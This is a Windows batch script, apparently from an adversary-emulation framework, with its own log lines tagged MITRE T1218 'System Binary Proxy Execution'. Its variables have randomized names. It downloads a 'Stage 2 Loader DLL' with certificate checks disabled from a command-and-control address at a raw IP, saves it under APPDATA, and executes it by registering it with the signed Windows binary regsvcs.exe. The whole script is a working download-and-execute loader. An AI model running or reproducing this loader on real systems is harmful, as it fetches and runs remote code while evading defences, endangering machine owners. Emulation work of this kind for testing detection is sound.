@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aB3xYz=%APPDATA%\49270\8c6fd0e1
SET mN9qR5=75055358.txt
SET tG7pL1=https://3.144.153.50/test/stage/2/icon.png?QFxBQ28-R1dE
SET vF2wK8=ITZEL-S2B
SET hJ4rX6=QFxBQ28
SET dE5tY0=R1dE
SET zC1sU3=%PUBLIC%\\macula-simulations.log
SET pQ8lM2=https://3.144.153.50/test

REM Cache timestamp once at script start for debug lines
SET tsvar=!DATE!/!TIME!

REM --- DEBUG: script start ---
echo [!tsvar!][DEBUG][!vF2wK8!][!hJ4rX6!]: script_start>> "!zC1sU3!" 2>nul

REM Ensure output directory exists
if not exist "!aB3xYz!" mkdir "!aB3xYz!" >nul 2>&1

REM --- DEBUG: heartbeat_start ---
echo [!tsvar!][DEBUG][!vF2wK8!][!hJ4rX6!]: heartbeat_start>> "!zC1sU3!" 2>nul

REM Heartbeat fetch — download Stage 2 Loader DLL from C2 and save to disk
curl -k -s -o "!aB3xYz!\!mN9qR5!.dll" "!tG7pL1!" >nul 2>&1
set curl_exit=%errorlevel%

REM --- DEBUG: heartbeat_complete ---
echo [!tsvar!][DEBUG][!vF2wK8!][!hJ4rX6!]: heartbeat_complete>> "!zC1sU3!" 2>nul

REM Verify download succeeded: check file exists and size > 0
set dll_path=!aB3xYz!\!mN9qR5!.dll
set dll_ok=0
if exist "!dll_path!" (
    for %%F in ("!dll_path!") do if %%~zF GTR 0 set dll_ok=1
)

if !dll_ok! equ 0 (
    REM --- DEBUG: heartbeat_result=fail ---
    echo [!tsvar!][DEBUG][!vF2wK8!][!hJ4rX6!]: heartbeat_result=1>> "!zC1sU3!" 2>nul
    goto :failure
)

REM --- DEBUG: chdir_start ---
echo [!tsvar!][DEBUG][!vF2wK8!][!hJ4rX6!]: chdir_start>> "!zC1sU3!" 2>nul

REM Position working directory
cd /d "!aB3xYz!" >nul 2>&1
set cd_exit=%errorlevel%

REM --- DEBUG: chdir_result ---
echo [!tsvar!][DEBUG][!vF2wK8!][!hJ4rX6!]: chdir_result=!cd_exit!>> "!zC1sU3!" 2>nul

if !cd_exit! neq 0 goto :failure

REM --- DEBUG: regsvcs_start ---
echo [!tsvar!][DEBUG][!vF2wK8!][!hJ4rX6!]: regsvcs_start>> "!zC1sU3!" 2>nul

REM Invoke Stage 2 DLL via regsvcs.exe (register, triggers [ComRegisterFunction])
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe "!mN9qR5!.dll" >NUL 2>&1
set regsvcs_exit=%errorlevel%

REM --- DEBUG: regsvcs_result ---
echo [!tsvar!][DEBUG][!vF2wK8!][!hJ4rX6!]: regsvcs_result=!regsvcs_exit!>> "!zC1sU3!" 2>nul

REM Generate TTP log line
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t
set ttp_line=[!timestamp!][TTP][!vF2wK8!][!hJ4rX6!]: T1218^|System Binary Proxy Execution=
if !regsvcs_exit! equ 0 (
    set ttp_line=!ttp_line![OK]:[]
) else (
    set ttp_line=!ttp_line![FAIL]:[regsvcs_exit_!regsvcs_exit!]
)
echo !ttp_line!>> "!zC1sU3!" 2>&1

REM --- DEBUG: script_end ---
echo [!tsvar!][DEBUG][!vF2wK8!][!hJ4rX6!]: script_end>> "!zC1sU3!" 2>nul
endlocal
exit /b !regsvcs_exit!

:failure
REM On any failure, log a TTP failure line
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t
echo [!timestamp!][TTP][!vF2wK8!][!hJ4rX6!]: T1218^|System Binary Proxy Execution=[FAIL]:[download_or_setup_failed]>> "!zC1sU3!" 2>&1
echo [!tsvar!][DEBUG][!vF2wK8!][!hJ4rX6!]: script_end>> "!zC1sU3!" 2>nul
endlocal
exit /b 1